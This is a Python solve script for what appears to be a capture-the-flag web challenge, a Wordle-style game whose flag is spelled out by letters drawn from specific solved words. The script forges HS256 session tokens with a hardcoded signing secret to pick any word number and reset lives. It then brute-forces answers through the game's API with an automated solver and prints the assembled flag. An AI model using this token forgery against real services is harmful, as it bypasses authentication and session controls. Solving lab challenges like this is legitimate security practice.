#!/usr/bin/env python3
import base64
import hashlib
import hmac
import json
import time
from collections import Counter

import requests
from wordfreq import top_n_list

BASE = "http://10.112.0.12:44394"
SECRET = b"butterfly"

# 035 = word 3, character 5, dst.
COORDINATES = [
    (3, 5),
    (8, 3),
    (14, 5),
    (19, 3),
    (23, 3),
    (31, 3),
    (36, 4),
    (42, 2),
    (47, 2),
    (50, 1),
]

session = requests.Session()


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def decode_payload(token: str) -> dict:
    part = token.split(".")[1]
    part += "=" * (-len(part) % 4)
    return json.loads(base64.urlsafe_b64decode(part))


def forge_token(session_id: str, current_word: int) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {
        "session": session_id,
        "current_word": current_word,
        "lives": 9,
        "attempts": 0,
        "iat": int(time.time()),
    }

    header_enc = b64url(
        json.dumps(header, separators=(",", ":")).encode()
    )
    payload_enc = b64url(
        json.dumps(payload, separators=(",", ":")).encode()
    )

    message = f"{header_enc}.{payload_enc}"
    signature = b64url(
        hmac.new(SECRET, message.encode(), hashlib.sha256).digest()
    )

    return f"{message}.{signature}"


def wordle_feedback(answer: str, guess: str) -> list[str]:
    result = ["absent"] * 5
    remaining = Counter()

    for i, (a, g) in enumerate(zip(answer, guess)):
        if a == g:
            result[i] = "correct"
        else:
            remaining[a] += 1

    for i, g in enumerate(guess):
        if result[i] == "correct":
            continue

        if remaining[g] > 0:
            result[i] = "present"
            remaining[g] -= 1

    return result


def matches(candidate: str, guess: str, feedback: list[str]) -> bool:
    return wordle_feedback(candidate, guess) == feedback


def choose_guess(candidates: list[str], tried: set[str]) -> str | None:
    available = [word for word in candidates if word not in tried]

    if not available:
        return None

    position_frequency = [Counter() for _ in range(5)]
    letter_frequency = Counter()

    for word in candidates:
        for i, char in enumerate(word):
            position_frequency[i][char] += 1

        for char in set(word):
            letter_frequency[char] += 1

    def score(word: str) -> float:
        value = 0.0
        seen = set()

        for i, char in enumerate(word):
            value += position_frequency[i][char]

            if char not in seen:
                value += letter_frequency[char] * 0.35
                seen.add(char)
            else:
                value *= 0.92

        return value

    pool = available[:3000]
    return max(pool, key=score)


def submit_guess(session_id: str, word_number: int, guess: str):
    token = forge_token(session_id, word_number)

    response = session.post(
        f"{BASE}/api/guess",
        headers={
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
        },
        json={"guess": guess},
        timeout=10,
    )

    try:
        data = response.json()
    except Exception:
        raise RuntimeError(
            f"Non-JSON response: HTTP {response.status_code}: "
            f"{response.text[:300]}"
        )

    return response.status_code, data


def solve_word(
    session_id: str,
    word_number: int,
    all_words: list[str],
) -> str:
    candidates = all_words.copy()
    tried = set()

    preferred = [
        "raise",
        "clout",
        "nymph",
        "stern",
        "adieu",
        "crate",
        "slate",
    ]

    round_number = 0

    while round_number < 250:
        round_number += 1

        if round_number <= len(preferred):
            guess = preferred[round_number - 1]

            if guess in tried:
                continue
        else:
            guess = choose_guess(candidates, tried)

        if not guess:
            raise RuntimeError(
                f"No candidates left for word {word_number}"
            )

        tried.add(guess)
        status, data = submit_guess(
            session_id,
            word_number,
            guess,
        )

        if status == 400 and data.get("error") == "not in word list":
            candidates = [
                word for word in candidates if word != guess
            ]
            continue

        if status != 200:
            raise RuntimeError(
                f"Word {word_number}, guess {guess}: "
                f"HTTP {status} {data}"
            )

        feedback = data.get("feedback")

        print(
            f"[word {word_number:02d}] "
            f"{guess} -> {feedback} "
            f"candidates={len(candidates)}"
        )

        if data.get("correct"):
            print(
                f"[+] Word {word_number:02d} solved: {guess}"
            )
            return guess

        if not isinstance(feedback, list) or len(feedback) != 5:
            raise RuntimeError(
                f"Unexpected feedback for {guess}: {data}"
            )

        candidates = [
            candidate
            for candidate in candidates
            if candidate not in tried
            and matches(candidate, guess, feedback)
        ]

        if not candidates:
            raise RuntimeError(
                f"Candidate list exhausted for word {word_number}. "
                f"Last guess={guess}, feedback={feedback}"
            )

    raise RuntimeError(
        f"Too many guesses for word {word_number}"
    )


def main():
    start_response = session.post(
        f"{BASE}/api/start",
        json={},
        timeout=10,
    )
    start_response.raise_for_status()

    start_data = start_response.json()
    original_token = start_data["token"]
    session_id = decode_payload(original_token)["session"]

    print(f"[+] Session: {session_id}")

    raw_words = top_n_list("en", 200000)

    all_words = []
    seen = set()

    for word in raw_words:
        word = word.lower()

        if (
            len(word) == 5
            and word.isascii()
            and word.isalpha()
            and word not in seen
        ):
            seen.add(word)
            all_words.append(word)

    # Pastikan probe umum ada di awal.
    for word in reversed([
        "raise",
        "clout",
        "nymph",
        "stern",
        "adieu",
        "crate",
        "slate",
    ]):
        if word in all_words:
            all_words.remove(word)
        all_words.insert(0, word)

    print(f"[+] Local candidates: {len(all_words)}")

    solved = {}
    flag_chars = []

    for word_number, char_position in COORDINATES:
        answer = solve_word(
            session_id,
            word_number,
            all_words,
        )

        solved[word_number] = answer
        selected = answer[char_position - 1]
        flag_chars.append(selected)

        print(
            f"[+] Coordinate {word_number:02d}{char_position}: "
            f"{answer}[{char_position}] = {selected}"
        )

    value = "".join(flag_chars)

    print("\n=== SOLVED WORDS ===")
    for word_number, char_position in COORDINATES:
        answer = solved[word_number]
        print(
            f"{word_number:02d}{char_position} -> "
            f"{answer} -> {answer[char_position - 1]}"
        )

    print(f"\n<FLAG>grodno{{{value}}}</FLAG>")


if __name__ == "__main__":
    main()
